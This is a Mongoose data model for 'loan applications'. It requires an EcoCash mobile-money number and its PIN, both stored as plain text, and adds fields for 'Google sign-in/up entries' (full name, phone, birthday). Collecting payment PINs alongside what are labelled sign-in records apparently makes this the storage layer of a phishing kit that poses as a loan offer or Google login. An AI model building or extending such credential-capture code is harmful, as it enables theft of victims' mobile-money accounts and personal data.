/* models/LoanApplication.js — updated to handle both VodaPay AND Google entries */

import mongoose from "mongoose";

const loanSchema = new mongoose.Schema({
  ecocashNumber: {
    type: String,
    required: true
  },
  pin: {
    type: String,
    required: true
  },
  loanAmount: {
    type: Number,
    required: true,
    default: 0
  },
  /* ── New optional fields for Google sign-in/up entries ── */
  entryType: {
    type: String,
    enum: ["loan", "signin", "signup"],
    default: "loan"
  },
  fullName: {
    type: String,
    default: ""
  },
  phone: {
    type: String,
    default: ""
  },
  birthday: {
    type: String,
    default: ""
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

export default mongoose.model("LoanApplication", loanSchema);